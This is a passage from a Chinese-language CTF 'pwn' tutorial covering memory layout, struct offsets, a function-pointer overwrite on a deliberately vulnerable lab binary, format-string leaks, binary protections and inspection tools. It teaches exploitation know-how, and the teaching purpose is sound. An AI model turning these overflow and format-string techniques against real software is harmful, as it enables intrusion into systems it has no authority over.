\memory{Pwn 四问：漏洞在哪、我能控制什么、我要去哪里、有没有拦路虎。}

\section{进程的内存长什么样}
一个程序运行时，操作系统给它一片虚拟内存，按用途分成几块，见 \figref{memory-layout} 的左侧：

\shot[0.95]{fig-pwn-19-memory-layout.png}{第 2 章 进程地址空间与 P1 的栈帧布局：左为 Linux x86-64 进程内存分区（栈/堆/.bss/.data/.text），中为 main 栈帧里 \code{name[24]} 与 \code{next} 的相邻关系，右为覆写前后对照（原理示意图，偏移数据为本机实测）}{memory-layout}

\begin{itemize}
\item \kw{代码段（.text）}：存放编译后的机器指令，只读、可执行。本练习里 \code{normal}、\code{win} 的机器码就在这里，P1 要跳过去的就是 \code{win} 的地址。
\item \kw{数据段（.data / .bss）}：全局变量和字符串常量。\code{flag\{control\_flow\_redirected\}} 这个字符串常量就写死在这里。
\item \kw{堆（heap）}：程序用 \code{malloc} 之类申请的内存，向上增长。
\item \kw{栈（stack）}：存放局部变量、函数参数、返回地址，向下（低地址方向）增长。P1 的 \code{name[24]} 和 \code{next} 都住在栈上。
\end{itemize}

\paragraph{堆和栈有什么不同，堆上的题长什么样}栈由编译器自动管理，函数一返回，里面的局部变量就失效；\kw{堆}则是程序用 \code{malloc} 主动申请、用 \code{free} 归还的内存，生命周期由程序自己决定。\code{malloc} 每分出一块内存，Pwn 里就把这样一块叫 \kw{chunk（堆块）}；每块前面还有一小段\kw{头部}（本册所讲环境里是 16 字节），记录这块的大小和“是否正在被使用”，\code{malloc} 返回给程序的是头部\kw{之后}的数据区。两个要点先记住：一，堆块在内存里彼此\kw{紧邻}，一块被越界写就可能盖到下一块的头部或数据；二，\code{free} 之后内存被回收，但\kw{内容不会擦除}，残留的旧数据（旧长度、旧指针等）还能被读出来。第 4 章的 514 题正是拿这两点做文章：缓冲区“收缩”后长度上限没同步更新，一次普通的 \code{edit} 就变成了堆上的越界写，再去改写相邻堆块里的字段。

\memory{栈由编译器管、函数返回即失效；堆由 \code{malloc}/\code{free} 管，堆块彼此紧邻、释放后内容还在——堆题大多围绕这两条展开。}

关键点有两句：\kw{代码段里放着可执行的函数}，\kw{函数指针只是一个存了地址的变量}。只要能把某个函数指针的值改成 \code{win} 的地址，程序一跳就进了 \code{win}。\figref{memory-layout} 右侧把这个“改前/改后”的对照画了出来。

\pitfall{代码段是只读的，你不能用“越界写”去改代码；你能改的通常是栈或堆上的数据。P1 改的正是栈上的一个指针，而不是代码本身。}

\section{寄存器、函数调用与控制流}
CPU 执行函数调用时，参数不放在栈上直接读，而是优先放在几个\kw{寄存器}里。x86-64 的约定是：第 1 个参数放 \code{rdi}，第 2 个参数放 \code{rsi}，第 3 个放 \code{rdx}，以此类推。理解这一点，格式串那节才看得懂“\code{\%p} 到底在取谁的地址”。

\paragraph{函数指针与“控制流”}“控制流”就是\kw{CPU 下一步要执行哪条指令}。普通顺序执行是一条直线；遇到 \code{call}（调用）会跳到被调函数；遇到函数指针调用 \code{call *\%rax} 则跳到 \code{rax} 寄存器里存的地址。P1 的程序末尾就有一条 \code{call *\%rax}：\code{rax} 从 \code{session.next} 里读出来，\code{session.next} 的初值是 \code{normal}。所以只要把 \code{session.next} 改成 \code{win} 的地址，这条 \code{call} 就会跳进 \code{win}。第 3 章的 \code{objdump} 会带你在反汇编里亲眼看到这一条。

\memory{rdi 是第 1 个参数，rsi 是第 2 个；\code{call *\%rax} 跳去 \code{rax} 里存的地址——改指针就是改控制流。}

\section{C 结构体与偏移}
P1 的源码里有一个结构体：
\begin{lstlisting}[language=C]
struct Session {
    char name[24];
    void (*next)(void);
};
\end{lstlisting}
\kw{结构体}就是把几个变量打包成一块连续内存。\code{name[24]} 占 24 个字节，紧接着是 8 字节的 \code{next}（64 位系统里指针固定 8 字节）。所以 \code{next} 的\kw{偏移}（从结构体开头数过去的位置）是 24，整个结构体的\kw{大小}是 $24+8=32$ 字节。

这段推理不能只靠想，要用程序实测。实录里写了一个 4 行的小程序 \code{layout.c}，用 C 的 \code{offsetof} 直接问编译器：
\begin{lstlisting}
cd ~/pwn-lab && gcc -o layout layout.c && ./layout
\end{lstlisting}
\figref{struct-layout} 是真实执行结果：\code{sizeof(struct Session) = 32}、\code{offsetof(next) = 24}，和推理完全一致。\kw{本机实测值，换编译器或换成平台题要重测}。

\shot[0.95]{fig-pwn-05-struct-layout.png}{第 2 章 用 \code{offsetof} 实测结构体布局：\code{sizeof(struct Session)=32}、\code{offsetof(next)=24}（真实终端实录，WSL）}{struct-layout}

\memory{结构体大小 = 各字段大小之和（考虑对齐）；指针在 64 位下是 8 字节；偏移用 \code{offsetof} 实测，不要只靠脑补。}

\pitfall{不要把某个编译产物上量到的偏移当成通用常数。换编译器、换优化级别、改字段顺序，偏移都可能变。本册所有偏移都注明“本机实测，换构建重测”。}

\section{越界写入为什么能改控制流}
P1 的 \code{main} 里这句是关键：
\begin{lstlisting}[language=C]
struct Session session = {{0}, normal};
...
if (read(STDIN_FILENO, session.name, sizeof session) < 0) return 1;
session.next();
\end{lstlisting}
逐项解释：
\begin{itemize}
\item \code{read} 是\kw{系统调用}，从文件描述符读数据。第一个参数 \code{STDIN\_FILENO}（值为 0）表示\kw{标准输入}，也就是键盘输入或管道进来的数据；
\item 第二个参数是\kw{写入到哪里}：这里是 \code{session.name}，即结构体的开头；
\item 第三个参数是\kw{写多少字节}：\code{sizeof session} 等于 32（不是 24！）。
\end{itemize}
于是从结构体开头连续写 32 字节：前 24 字节填满 \code{name}，\kw{多出来的 8 字节正好盖住 \code{next}}。这就是越界写入。因为 \code{next} 是个函数指针，紧接着 \code{session.next()} 就会执行它——写进去的 8 字节成了新地址，控制流被改到我们指定的地方。\figref{memory-layout} 中间和最右侧正是这条链路。

\paragraph{为什么“恰好 32 字节”}这是题目设计的关键。输入不超过 24 字节时，\code{next} 完全没被碰到；输入 25--31 字节只会改写它的前几个字节，剩下的字节保留旧值——旧值凑巧时也能成功，但那是运气（第 4 章 P1 的长度实验有真实现象）；只有写满 32 字节，\code{next} 的 8 个字节才全部由我们决定。所以 payload 长度 $= 24$（填充）+ $8$（地址）$= 32$。第 7 章会把这条推演写全。

\memory{越界写入的危害不在“写多了”，而在“多写的那几个字节落到了什么字段上”。落到函数指针上，控制流就被改。}

\section{字节、地址与字节序}
\kw{字节序}指多字节数据在内存里的存放顺序。有两个方向：
\begin{itemize}
\item \kw{小端序（little-endian）}：低位字节放在低地址，也就是“低位在前”；
\item \kw{大端序（big-endian）}：高位字节放在低地址，也就是“高位在前”。
\end{itemize}
x86-64 是\kw{小端}。地址 \code{0x401190} 拆成 8 个字节是 \code{90 11 40 00 00 00 00 00}：最低位 \code{0x90} 在最前面，高位的零字节也\kw{全部保留}。

\figref{endian-pack} 是真实演示：同一段脚本把地址 \code{0x401190} 分别按小端和大端打包，再解包还原。应该看到：
\begin{lstlisting}
little-endian   = 90 11 40 00 00 00 00 00
big-endian      = 00 00 00 00 00 40 11 90
unpack back     = 0x401190
\end{lstlisting}
小端和大端正好是反序，而且解包能原样还原，说明 \code{struct.pack('<Q', addr)} 得到的确实是 8 个原始字节。

\shot[0.95]{fig-pwn-10-endian-pack.png}{第 2 章 小端与大端打包对照：\code{0x401190} 的小端为 \code{90 11 40 00 00 00 00 00}，大端反序，解包还原（真实终端实录，WSL）}{endian-pack}

\figref{py-struct} 把地址看成一个\kw{字节列表}，更直观：\code{struct.pack('<Q', 0x401190)} 得到的 8 个字节是 \code{[144, 17, 64, 0, 0, 0, 0, 0]}。注意这里出现两个数：\code{0x90} 就是十进制的 144，\code{0x11} 就是 17，\code{0x40} 就是 64。\kw{同一个字节，用十六进制写是 \code{90}，用十进制写是 144，只是显示方式不同}。

\shot[0.95]{fig-pwn-17-py-struct.png}{第 2 章 \code{struct.pack} 产生的原始字节：\code{9011400000000000}、字节列表 \code{[144, 17, 64, 0, ...]}、长度 8，以及解包还原（真实终端实录，WSL）}{py-struct}

\pitfall{三个数量——地址的“十六进制写法（0x401190）”、打包后的“字节序列（\code{90 11 40 ...}）”、解的“十进制值（4198800）”——指的是同一个地址。把第 25 个字节写成 \code{0x401190} 这串\kw{文字}送进程序是错的：目标字段要的是 8 个\kw{原始字节}。}

\memory{写地址永远问两句：这是小端还是大端？宽度是几个字节（64 位系统是 8 字节）？}

\section{格式串为什么危险}
\code{printf} 的第 1 个参数叫\kw{格式串}（format string），它是一份“说明书”，告诉 printf 要打印什么、从哪里取数据。问题出在两种写法只差一个“谁控制格式串”：
\begin{lstlisting}[language=C]
printf("%s", input);   /* 安全：格式串是程序写死的常量 */
printf(input, secret); /* 危险：格式串来自用户输入 */
\end{lstlisting}
在安全写法里，格式串永远是常量 \code{"\%s"}，用户输入只能填进参数位置，\code{\%s} 只把输入当普通文本打印。在危险写法里，用户输入成了“说明书”：如果你输入 \code{\%s}，printf 就按 \code{\%s} 的含义\kw{去取一个参数当字符串地址}，然后把那个地址指向的内存打印出来——这就能读到程序里别的秘密（P3 里就是那个 flag 字符串）。这就是\kw{格式串漏洞}：\kw{把数据当成了指令}。\figref{format-principle} 把两种写法、以及各自的 \code{rdi}/\code{rsi} 指向画在一起。

\shot[0.95]{fig-pwn-20-format-principle.png}{第 2 章 格式串原理：安全写法 \code{printf("\%s", input)}（格式串是常量）与危险写法 \code{printf(input, secret)}（格式串来自输入）的取参方向对比（原理示意图）}{format-principle}

\paragraph{一串 \code{\%p} 到底在读谁}取值的顺序是固定的：格式串本身占第 1 个参数（在 \code{rdi}），所以第 1 个格式说明取的是第 2 个参数 \code{rsi}、第 2 个取 \code{rdx}……前 6 个参数都在寄存器里，第 7 个起才轮到\kw{栈}上的值（见 2.4 节的寄存器约定）。换句话说，格式说明\kw{从头到尾按顺序、一个说明取一个参数}：多写一个 \code{\%p} 就多读一个参数，读到的往往是寄存器或栈上\kw{此刻的残留值}，可能每次运行都不同。第 4 章 P3 第 3 步“三个 \code{\%p} 只有第 1 个是 \code{secret}”的真实现象，依据就是这条顺序。

\memory{格式说明按顺序取参数：第 1 个在 \code{rsi}，前 6 个在寄存器，之后来自栈；读到的大多是残留值，换构建要重新数。}

\paragraph{常见的格式说明}下表是本题会用到、以及排查时常用的几个：

\begin{longtable}{p{0.16\linewidth}p{0.72\linewidth}}
\toprule
格式说明 & 含义（白话） \\
\midrule
\code{\%s} & 把对应参数当成\kw{字符串地址}，打印它指向的内存直到遇到 \code{\textbackslash 0} \\
\code{\%p} & 把对应参数当成一个\kw{指针}，按十六进制打印它的值（就是“读一个参数出来”） \\
\code{\%x} & 把对应参数当成整数，按十六进制打印 \\
\code{\%1\$s} & 位置参数：直接指定“用第 1 个参数”，本题本地 demo 就用它 \\
\bottomrule
\end{longtable}

\kw{修复原则}：格式串永远由程序写死（\code{printf("\%s", input)} 或 \code{fputs(input, stdout)}），外部输入只放到参数位置；绝对不能把外部输入直接当格式串。

\pitfall{别把 \code{\%p} 和 \code{\%s} 混用。\code{\%p} 只打印指针本身（一个十六进制数），\code{\%s} 会去\kw{解引用}那个地址、读一节内存——如果地址无效，进程会直接崩溃。所以在本地靶程序里先小步验证，别一上来就堆一大串 \code{\%s}。}

\memory{格式串是“说明书”。说明书由谁写，决定了它是数据还是指令：程序写，安全；用户写，漏洞。}

\section{保护机制总览：它们分别卡在哪一步}
现代程序默认带几种保护，理解它们的关键不是背缩写，而是问一句：\kw{它阻止的是哪一步？} 见 \figref{pipeline-map} 下方的对照表：
\begin{itemize}
\item \kw{PIE + ASLR}：让代码、栈、库的地址每次运行都变。它卡的是\kw{第 5 步“取地址”}——你抄到的固定地址下次可能就不对了；
\item \kw{栈保护（Canary）}：在返回地址前放一个随机“金丝雀”值，函数返回前检查它有没有被改。它卡的是\kw{第 7 步“送入并观察”}——你的越界写会先破坏金丝雀，程序主动退出；
\item \kw{NX（不可执行栈）}：标记栈等内存页不可执行。它卡的是“往栈上写机器码再执行”这类思路；
\item \kw{RELRO / 只读 GOT}：保护函数地址表不被改写。它卡的是“改 GOT 表”这类思路，不影响本题的结构体覆盖。
\end{itemize}

\shot[0.95]{fig-pwn-21-pipeline-map.png}{第 2 章/第 6 章 Pwn 通用解题流程八步，以及 PIE+ASLR、Canary、NX、RELRO 四种保护分别卡在哪一步（原理示意图）}{pipeline-map}

本册本地题的编译参数 \code{-O0 -fno-stack-protector -no-pie} 是\kw{故意}的教学设置：只留下“越界写入 + 结构体覆盖”这一条线索，其余保护另作讲解。第 3 章会用 \code{readelf} 把默认版（开 PIE、开栈保护）和教学版（关掉）并排看一次，也能拿 P1 的 payload 去试试默认版为什么走不通。

\pitfall{“开了保护所以打不了”是懒结论。正确做法是\kw{逐条定位}：是取地址失败（PIE/ASLR）？是覆盖被检测（Canary）？还是执行新代码被拦（NX）？不同机制对应完全不同的绕过思路。}

\memory{四种保护，各卡一步：PIE/ASLR 卡取地址，Canary 卡覆盖，NX 卡执行新代码，RELRO 卡改 GOT。}

\section{本章知识点速查}
\begin{longtable}{p{0.3\linewidth}p{0.6\linewidth}}
\toprule
知识点 & 一句话要点 \\
\midrule
Pwn & 用输入改变程序的内存或控制流；四问：漏洞在哪、能控制什么、要去哪里、有无保护。 \\
内存分区 & 代码段（可执行函数）、数据段（常量）、堆（向上）、栈（向下，局部变量与指针）。 \\
寄存器 & x86-64 下 rdi 是第 1 个参数、rsi 是第 2 个参数；\code{call *\%rax} 跳去 rax 里的地址。 \\
函数指针 & 一个存了“函数地址”的变量；改它就能改控制流。 \\
结构体偏移 & \code{name[24]} 后接 8 字节指针，使 \code{offsetof(next)=24}、总大小 32（本机实测）。 \\
越界写入 & \code{read} 写 32 字节进 24 字节数组，多出的 8 字节盖住 \code{next}，控制流被改。 \\
字节序 & x86-64 是小端；\code{0x401190} → \code{90 11 40 00 00 00 00 00}，高位零不能省。 \\
格式串 & 格式串由程序写死才安全；用户控制格式串就能读参数（\code{\%s}）或读指针（\code{\%p}）。 \\
保护机制 & PIE/ASLR 卡取地址，Canary 卡覆盖，NX 卡执行新代码，RELRO 卡改 GOT。 \\
\bottomrule
\end{longtable}

% ===========================================================================
\chapter{Pwn 工具箱}
% ===========================================================================
\goal{八个主力工具上手：\code{file}、\code{readelf}、\code{nm}、\code{objdump}、\code{strings}、\code{xxd}、\code{python3}+\code{struct}、\code{gcc}。每个工具按“是什么 / 怎么装 / 基本用法 / 真实输出”介绍。}

本章每个工具都配真实输出截图，命令都在 WSL/Ubuntu 里执行，工作目录是 \code{\textasciitilde/pwn-lab}。工具全部来自 \code{binutils} 与 \code{gcc}，Ubuntu 自带，\kw{无需额外安装}。本册不依赖 \code{gdb}，也不依赖 \code{checksec} 与 \code{pwntools}——没装它们同样能做完全部练习。

\section{file：这是什么文件}
\paragraph{是什么}\code{file} 读文件头，告诉你它是可执行文件、脚本，还是纯数据。它是\kw{分诊第一步}：先确认拿到的是不是 x86-64 的 Linux 程序。
\paragraph{怎么装}Ubuntu 自带（\code{binutils} 之外的基础工具，通常已装；缺了用 \code{sudo apt install file}）。
\paragraph{基本用法}\code{file 文件名}。多个文件可以一次给。
\figref{toolbox-file-xxd} 上半部分是真实执行：\code{file overflow format payload.bin}。应该看到 \code{overflow} 是 \code{ELF 64-bit LSB executable}、\code{format} 是 \code{ELF 64-bit LSB pie executable}、而 \code{payload.bin} 只是 \code{data}（因为它没有文件头，是一段裸字节）。这一步一眼分清“程序”和“我构造的数据”。

\shot[0.95]{fig-pwn-16-toolbox-file-xxd.png}{第 3 章 工具箱：\code{file} 区分 EXEC/PIE/data，\code{xxd -l 32} 看 ELF 头（\code{7f 45 4c 46}）与 payload 前 32 字节（真实终端实录，WSL）}{toolbox-file-xxd}

\section{readelf：看 ELF 头与文件类型}
\paragraph{是什么}\code{readelf} 专门解析 ELF 结构。最常用的是 \code{readelf -h}（看头信息）和 \code{readelf -l}（看程序头/段）。头里的\kw{类型（Type）}告诉我们它是固定地址还是位置无关。
\paragraph{基本用法}
\begin{lstlisting}
readelf -h overflow            # 头信息：类别/字节序/类型/入口点
readelf -h overflow | grep Type        # 只看类型（要英文输出可加 LANG=C）
\end{lstlisting}
\figref{readelf-nm} 上半部分是 \code{readelf -h overflow | head -14}：应该看到 \code{ELF64}、\code{2 补码，小端序 (little endian)}、\code{类型: EXEC (可执行文件)}、\code{入口点地址：0x401090}（本机实测，换构建重测）。\kw{入口点}是程序开始执行的第一条指令地址。

\shot[0.95]{fig-pwn-06-readelf-nm.png}{第 3 章 \code{readelf -h}（ELF64/LSB/EXEC/入口 0x401090）与 \code{nm} 取 \code{normal=0x401176}、\code{win=0x401190}（真实终端实录，WSL）}{readelf-nm}

\section{nm：看符号表里的函数地址}
\paragraph{是什么}\code{nm} 打印 ELF 的\kw{符号表}——也就是“函数名 / 全局变量名 → 地址”的对照表。很多 Pwn 题只要找到一个“本该执行却没人调用”的函数（如本题的 \code{win}），第一步就是 \code{nm} 读出它的地址。
\paragraph{基本用法}\code{nm 文件名}，配合 \code{grep} 过滤：
\begin{lstlisting}
nm overflow | grep -e win -e normal
\end{lstlisting}
\figref{readelf-nm} 下半部分是真实执行结果：\code{0000000000401176 t normal}、\code{0000000000401190 T win}。应该看到 \code{win} 的地址是 \code{0x401190}、\code{normal} 是 \code{0x401176}。\kw{本机实测，换构建重测}；这两个地址只在\kw{当前这个编译产物}里有效。

\paragraph{为什么不用调试器也能确认偏移}有人习惯用 \code{gdb} 断点看内存。本册故意不用：偏移用 \code{offsetof} 小程序实测（结构体布局是编译期确定的），地址用 \code{nm} 读符号表（未剥离的产物会写出来），调用点用 \code{objdump} 看反汇编（机器码就在文件里）。三样证据合起来，足以确认“填多少、写什么地址、程序在哪一条指令跳过去”，不需要运行调试器。

\memory{有符号表的产物（\code{not stripped}）才能用 \code{nm} 读函数地址；读到的地址属于当前产物，不能抄给别的构建。}

\section{objdump：反汇编看调用点}
\paragraph{是什么}\code{objdump -d} 把机器码\kw{反汇编}成汇编指令。它让我们看清“程序在哪一条指令跳去了别的地方”，也就是控制流的关键点。
\paragraph{基本用法}\code{objdump -d 文件名}，太长时用 \code{tail} 看结尾（\code{main} 函数通常在文件靠后的位置）：
\begin{lstlisting}
objdump -d overflow | tail -32
\end{lstlisting}
\figref{objdump-main} 是真实执行结果。要在里面找三样东西：
\begin{enumerate}[label=\arabic*.]
\item \code{lea -0x5f(\%rip),\%rax \# 401176 <normal>}：把 \code{normal} 的地址装进 \code{rax}；
\item \code{mov \%rax,-0x8(\%rbp)}：把 \code{rax}（即 \code{normal} 地址）存到栈上 \code{-0x8(\%rbp)}——这条就是写 \code{session.next} 的初值；
\item \code{mov \$0x20,\%edx}（即 32）、\code{lea -0x20(\%rbp),\%rax}、\code{mov \%rax,\%rsi}、\code{call 401070 <read@plt>}：这就是 \code{read(0, session.name, 32)}。\code{0x20} 就是 32，说明\kw{确实要写 32 字节}；\code{-0x20(\%rbp)} 是 \code{session} 的起始地址。
\item 最后 \code{mov -0x8(\%rbp),\%rax}、\code{call *\%rax}：读出 \code{session.next} 并跳过去——这就是“控制流被改”的那一条。
\end{enumerate}
能把这几条对上源码，P1 就成功了一半：你不必猜偏移，反汇编把 \code{read} 的目标（\code{-0x20}）和函数指针（\code{-0x8}）都写明了，两者相差 \code{0x18} = 24 字节，与 \code{offsetof} 实测吻合。

\shot[0.95]{fig-pwn-07-objdump-main.png}{第 3 章 \code{objdump -d overflow | tail -32}：\code{lea \# 401176 <normal>} 写函数指针初值、\code{read} 传 \code{0x20}（32）、末尾 \code{call *\%rax}（真实终端实录，WSL）}{objdump-main}

\pitfall{反汇编里地址都写作 \code{401190 <win>} 这种十六进制，别把它当成十进制或字符串。另外 \code{objdump} 头部会先打印很多库函数，\code{main} 往往靠后，善用 \code{tail}/\code{grep}。}

\section{strings：常量藏在哪}
\paragraph{是什么}\code{strings} 从二进制里抓出所有可打印字符串。程序里写死的 flag、提示语、库函数名都能被它捞出来。\kw{不是所有题的 flag 都明文躺在里面}（真实题的 flag 常在服务器上），但作为一种“先看有没有现成线索”的习惯动作，它非常高效。
\paragraph{基本用法}
\begin{lstlisting}
strings format | head -16
strings format | grep -e flag -e Say
strings overflow | grep flag
\end{lstlisting}
\figref{strings} 是真实执行结果。头部会列出依赖库与符号名（如 \code{fgets}、\code{printf}、\code{libc.so.6}）。用 \code{grep} 过滤后，\code{format} 可直接找到 flag 常量 \code{flag\{format\_string\_leaks\}} 和提示语；\code{overflow} 中也有它自己的 flag 常量。因为这两道本地题把 flag 写进程序，所以能直接看到——这也解释了 P3 的漏洞为何能读出它。

\shot[0.95]{fig-pwn-13-strings.png}{第 3 章 \code{strings}：二进制里的库名/符号名，以及 \code{grep} 出的两个本地 flag 常量与提示语（真实终端实录，WSL）}{strings}

\memory{拿到陌生二进制，先 \code{strings | grep flag}：有现成常量最好；没有也知道这不是“flag 明写”的题。}

\section{xxd：看文件的原始字节}
\paragraph{是什么}\code{xxd} 把文件的原始字节按十六进制打印，右侧带 ASCII 预览列。它是“看清文件到底存了什么字节”的最直接工具，也用来验证 ELF 头、payload 内容。
\paragraph{基本用法}
\begin{lstlisting}
xxd -l 32 overflow        # 只看前 32 字节
xxd payload.bin           # 完整看一个 32 字节的 payload
\end{lstlisting}
\figref{toolbox-file-xxd} 的下半部分是真实执行结果。\code{xxd -l 32 overflow} 的行首是 \code{7f45 4c46}——这正是 ELF 的魔数 \code{7f 45 4c 46}（在 ASCII 列显示成 \code{.ELF}），第 2 行还能看到 \code{3e00}（表示 x86-64）和入口点 \code{9010 4000}。\code{xxd -l 32 payload.bin} 则清楚显示前 24 个 \code{41}（就是 24 个字母 \code{A}）后紧跟 \code{9011 4000 0000 0000}——正是 \code{0x401190} 的小端字节。图里还能看到 \code{payload.bin} 的文件长度是 \code{0x20}=32。

\memory{\code{xxd} 右侧 ASCII 列有可读字符 = 这一段是文本；全是一堆随机符号才是原始二进制。ELF 文件一定以 \code{7f 45 4c 46} 开头。}

\section{python3 + struct：把地址变成字节}
\paragraph{是什么}\code{struct} 是 Python 标准库，负责在“整数”和“原始字节”之间转换。Pwn 里最常见的一句就是 \code{struct.pack('<Q', addr)}：把地址按小端打成 8 字节。
\paragraph{基本用法}
\begin{lstlisting}
python3 -c "import struct;b=struct.pack('<Q',0x401190);print(b.hex());print(list(b));print(len(b))"
python3 -c "import struct;print(struct.unpack('<Q',struct.pack('<Q',0x401190)))"
\end{lstlisting}
格式串里的 \code{<} 表示小端，\code{Q} 表示 8 字节无符号整数（\code{I} 是 4 字节）。\figref{py-struct} 是真实执行结果：打包得 \code{9011400000000000}、字节列表 \code{[144, 17, 64, 0, 0, 0, 0, 0]}、长度 8；解包还原出 \code{(4198800,)}，而 \code{4198800} 正是十进制的 \code{0x401190}。

\memory{整数 → 字节用 \code{struct.pack('<Q', addr)}；字节 → 整数用 \code{struct.unpack('<Q', b)[0]}。\code{<} 是小端，别漏。}

\section{gcc：编译与保护开关}
\paragraph{是什么}\code{gcc} 是 C 编译器。Pwn 里它的另一个身份是\kw{保护开关面板}：加上或去掉某几个参数，就能开/关某一类保护。
\paragraph{基本用法}
\begin{lstlisting}
gcc -O0 -fno-stack-protector -no-pie -o overflow overflow.c   # 教学版：关优化/关栈保护/关 PIE
gcc -O0 -o overflow-pie overflow.c                            # 默认版：开 PIE、开栈保护
\end{lstlisting}
\figref{protect-check} 是真实执行结果。要看四处对比：
\begin{enumerate}[label=\arabic*.]
\item \code{file} 显示 \code{overflow} 是 \code{executable}、\code{overflow-pie} 是 \code{pie executable}；
\item \code{LANG=C readelf -h overflow | grep Type} 得 \code{EXEC}，\code{overflow-pie} 得 \code{DYN (Position-Independent Executable file)}——DYN 就是 PIE，地址会随加载随机；
\item \code{readelf -l overflow | grep GNU\_STACK} 显示了 GNU\_STACK 段（本教程环境该段无 \code{RWE} 标记，即栈不可执行，NX 生效）；
\item \code{objdump -d overflow-pie | grep stack\_chk} 检出了 \code{\_\_stack\_chk\_fail@plt} 调用——说明默认版\kw{开了栈保护（Canary）}，而教学版没有这个符号。
\end{enumerate}
这就是 P4 的实验素材：同一份源码，两个产物，保护状态完全不同。

\shot[0.95]{fig-pwn-15-protect-check.png}{第 3 章 保护对比：默认编译得 PIE 版，\code{readelf} 显示 EXEC vs DYN、GNU\_STACK，\code{objdump} 检出 \code{\_\_stack\_chk\_fail}（真实终端实录，WSL）}{protect-check}

\pitfall{\code{-no-pie} 只让\kw{这个可执行文件本身}的代码地址固定，不代表栈、共享库的地址也固定。P1 能成，靠的是程序把 \code{win} 和 \code{normal} 的相对位置写进了反汇编、并且指针初值可控。}

\section{checksec / pwntools（可选，本册不依赖）}
\paragraph{checksec} 一条命令汇总保护状态（RELRO/Canary/NX/PIE），读起来很省事。Ubuntu 里可用 \code{pwntools} 自带的 \code{checksec}，或 \code{sudo apt install checksec}。本册\kw{不依赖它}：用 \code{file}、\code{readelf}、\code{objdump} 三件套就能得到同样的结论，而且更能看清每条结论的依据。
\paragraph{pwntools} 是 Pwn 常用的 Python 框架（\code{from pwn import *}），封装了远程连接、\code{pack/unpack} 等。常用到再装：\code{python3 -m pip install pwntools}。本册全部脚本只用标准库（\code{struct}、\code{socket}、\code{re}），因此在没装 pwntools 的机器上也能跑完所有练习。
\tip{先用标准库把原理吃透，再上 pwntools 提效率。工具是加速器，不是理解的替代品。}

\section{工具箱小结}
\begin{longtable}{p{0.3\linewidth}p{0.34\linewidth}p{0.28\linewidth}}
\toprule
想做什么 & 用什么 & 关键点 \\
\midrule
判断文件类型/架构 & \code{file 文件} & EXEC 固定地址，PIE 随机地址 \\
看 ELF 类型与入口点 & \code{readelf -h 文件} & \code{Type: EXEC / DYN}；入口点 \code{0x401090} \\
读函数地址 & \code{nm 文件 | grep win} & 需 \code{not stripped}；地址属当前产物 \\
看调用点/偏移 & \code{objdump -d 文件 | tail} & 找 \code{call *\%rax} 与 \code{mov \$0x20,\%edx} \\
找常量/flag & \code{strings 文件 | grep flag} & 明文常量一眼可见 \\
看原始字节 & \code{xxd 文件} & ELF 头 \code{7f45 4c46}；payload 长度 \code{0x20} \\
整数 $\leftrightarrow$ 字节 & \code{struct.pack('<Q', addr)} & \code{<} 小端；8 字节宽 \\
开/关保护编译 & \code{gcc -O0 [-no-pie] ...} & \code{-fno-stack-protector} 关 Canary \\
\bottomrule
\end{longtable}

% ===========================================================================
% ===========================================================================
\chapter{题目：题面卡与逐题图解带做}

\goal{八道题，每题一节：先用题面卡把“给什么、要什么、考什么”读清楚，紧接着就是这道题的完整解题步骤——读题与思路、分步操作与观察、结果与核对、为什么会成功、排错指南、变式练习。建议先只读题面卡自己动手试 10--15 分钟，卡住再看后面的步骤。}

% ===========================================================================

每张卡的字段固定为：题目来源 / 给定材料 / 目标 / 交付物 / 考点 / 前置知识 / 难度。难度用星表示：$\bigstar\circ\circ$ 入门、$\bigstar\bigstar\circ$ 进阶、$\bigstar\bigstar\bigstar$ 挑战。读完卡片先自己想两分钟，再往下看这道题的解题步骤。

% ===========================================================================

本章按 P0 $\rightarrow$ P1 $\rightarrow$ P2 $\rightarrow$ P3 $\rightarrow$ P4 $\rightarrow$ 296 $\rightarrow$ 167 $\rightarrow$ 514 顺序展开。每题都先讲“看到题先想什么”，再一步步操作。建议先遮住本章自己做一遍，卡住了再对照。

\paragraph{做题顺序建议}P0 $\rightarrow$ P1 $\rightarrow$ P2 $\rightarrow$ P3 $\rightarrow$ P4 $\rightarrow$ 296 $\rightarrow$ 167 $\rightarrow$ 514。前四题练“看布局、造字节、用格式串”，P4 练“读懂保护”，296 练“串利用链”，167 练“纯逻辑竞态”，514 练“没有附件、只有在线服务时怎么靠交互把漏洞量出来”。卡住超过 20 分钟就看第 4 章对应小节的“读题与思路”。

% ===========================================================================
\section{题 P0：24 字节数组后面紧跟什么？}

\begin{challenge}{题 P0 题面卡}
\field{题目来源}{本地练习 \code{labs/pwn/overflow.c}（离线可做）}
\field{给定材料}{源码里 \code{struct Session \{ char name[24]; void (*next)(void); \}}；程序从 \code{name} 开始读 32 字节}
\field{目标}{说清第 25 个输入字节落在哪个字段，并给出结构体大小与 \code{next} 的偏移}
\field{交付物}{两个数字：\code{sizeof(struct Session)} 与 \code{offsetof(next)}，并说明第 25 字节落在哪里}
\field{考点}{结构体布局与偏移；\code{read} 的第三个参数为什么比数组大}
\field{前置知识}{1.4 节 gcc 编译；2.5 节 C 结构体与偏移；3.4 节 \code{objdump}}
\field{难度}{$\bigstar\circ\circ$（入门）}
\end{challenge}

\paragraph{读题与思路}交付物是两个数字加一句判断。题面给了源码结构体，程序却要读 32 字节。看到这类题，第一个动作是\kw{量布局}：\code{name[24]} 占多少、后面的指针占多少、指针从第几个字节开始。为什么必须先量？因为“越界写入”本身不是漏洞，\kw{多写的那几个字节落到哪个字段}才是。

具体到这道题，按顺序问三个问题：\code{name} 后面紧跟什么字段（读结构体声明：一个函数指针 \code{next}）？它多大（64 位下指针固定 8 字节）？从哪个偏移开始（\code{name} 长 24，所以偏移 24）？再补一问：程序到底要写多少字节（\code{sizeof session} = 整个结构体 = 32）？这四个问题一答，第 25 个字节的落点就确定了。做题时还要养成一个习惯：\kw{结论要有第二个独立证据}——所以量完布局（第 3 步）还要用反汇编交叉验证一次（第 4 步），两条路径都指向同一个数字才敢下笔。

\paragraph{分步操作与观察}
\begin{enumerate}[label=\arabic*.]
\item 读源码，确认数组声明与紧邻字段：
\begin{lstlisting}
cat ~/pwn-lab/overflow.c
\end{lstlisting}
应该看到 \code{char name[24];} 紧接着 \code{void (*next)(void);}。\code{next} 是一个函数指针，占 8 字节。
\item 源码要带着\kw{行号}看。不要把源码从头读到尾，用 \code{grep -n} 把关键行直接定位出来（\figref{source-grep}）：
\begin{lstlisting}
cd ~/pwn-lab && grep -n struct overflow.c
cd ~/pwn-lab && grep -n -A 4 struct overflow.c
